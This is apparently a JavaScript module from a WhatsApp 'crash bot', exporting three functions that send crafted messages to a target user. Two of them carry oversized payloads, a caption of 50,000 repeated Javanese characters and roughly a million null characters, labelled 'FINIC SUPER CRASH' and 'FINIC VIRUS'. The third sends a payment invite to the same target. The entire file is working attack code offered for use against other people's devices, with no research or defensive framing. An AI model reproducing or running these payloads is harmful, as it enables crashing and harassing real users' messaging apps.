exports.old1 = async (WynzX, target) => {
    WynzX.relayMessage(target, { 
        "viewOnceMessage": {
            "message": {
                "liveLocationMessage": {
                    "degreesLatitude": "p",
                    "degreesLongitude": "p",
                    "caption": `FINIC SUPER CRASH⃝👾⃝ ` + "ꦾ".repeat(50000),
                    "sequenceNumber": "0",
                    "jpegThumbnail": ""
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
    console.log(`FINIC SUPER CRASH`);
}

exports.old2 = async (WynzX, target) => {
    WynzX.relayMessage(target, { 
        'viewOnceMessage': {
            'message': {
                'interactiveMessage': {
                    'header': {
                        'title': '',
                        'subtitle': " "
                    },
                    'body': {
                        'text': "FINIC VIRUS"
                    },
                    'footer': {
                        'text': 'xp'
                    },
                    'nativeFlowMessage': {
                        'buttons': [{
                            'name': 'cta_url',
                            'buttonParamsJson': "{ display_text : 'FINIC SUPER CRASH', url : '', merchant_url : '' }"
                        }],
                        'messageParamsJson': "Xnaf়" + "\u0000".repeat(1010000)
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
    
    console.log(`FINIC SUPER CRASH`);
}

exports.old3 = async (WynzX, target) => {
    await WynzX.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};